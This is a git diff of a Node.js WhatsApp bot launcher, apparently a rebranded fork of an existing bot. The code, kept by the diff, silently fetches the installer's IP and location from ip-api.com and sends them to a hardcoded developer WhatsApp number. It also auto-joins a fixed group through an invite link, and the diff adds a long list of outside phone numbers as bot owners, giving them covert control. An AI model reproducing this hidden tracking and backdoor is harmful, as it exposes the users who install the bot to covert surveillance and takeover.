@@ -23,7 +23,7 @@ async function starts() {
 denz.autoReconnect = ReconnectMode.onConnectionLost
     denz.version = [2, 2140, 12]
     denz.logger.level = 'warn'
-    denz.browserDescription = ['Dcode Denpa','Desktop','3.0']
+    denz.browserDescription = ['Fajar Alfarizi','Desktop','3.0']
     await sleep(10000)
     denz.on('qr', qr => {
         qrcode.generate(qr, { small: true })
@@ -36,14 +36,14 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
         })
      
       await denz.connect({ timeoutMs: 30 * 1000 });
-  teks = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
+  teks = `https://chat.whatsapp.com/K1eU4aZZ8k7BO6eNndwvY1`
  denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
- denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+ console.log(color('|WRN|', 'yellow'), color('Joined to 𝑀𝑒𝑔𝑢𝑚𝑖𝑛 𝐵𝑂𝑇 group', 'cyan'))
+ denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝑀𝑒𝑔𝑢𝑚𝑖𝑛 𝐵𝑂𝑇",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6285866295942@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+       denz.sendMessage("6281333782061@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝑀𝑒𝑔𝑢𝑚𝑖𝑛 𝐵𝑂𝑇",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6281333782061?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -65,8 +65,8 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["6285866295942@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "6285866295942@s.whatsapp.net"
+        ownerNumber = ["6281333782061@s.whatsapp.net","994403792696@s.whatsapp.net","48459065026@s.whatsapp.net","6281259909513@s.whatsapp.net","6289512871985@s.whatsapp.net","447451215242@s.whatsapp.net","447441417460@s.whatsapp.net","380943043840@s.whatsapp.net","6289512871985@s.whatsapp.net","6287819948818@s.whatsapp.net","994406309372@s.whatsapp.net","48699527399@s.whatsapp.net","994405054360@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "6281333782061@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
         
@@ -150,7 +150,7 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))},exec(`mkdir $HOME/.termux/ ;echo "extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (error, stdout, stderr) => {
+			console.log(stdout), console.log(bgcolor('https://github.com/Tersakiti404-cyber/bitch-bot', 'cyan'))},exec(`mkdir $HOME/.termux/ ;echo "extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (error, stdout, stderr) => {
       console.log(stdout)}))}, 200 ) ;
 	}
 	else
@@ -166,7 +166,7 @@ console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		vertivalLayout: 'default',
 		width: 80,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping(' Created By 𝐹𝑎𝑗𝑎𝑟 𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
 	title: '\n\nLoading' ,
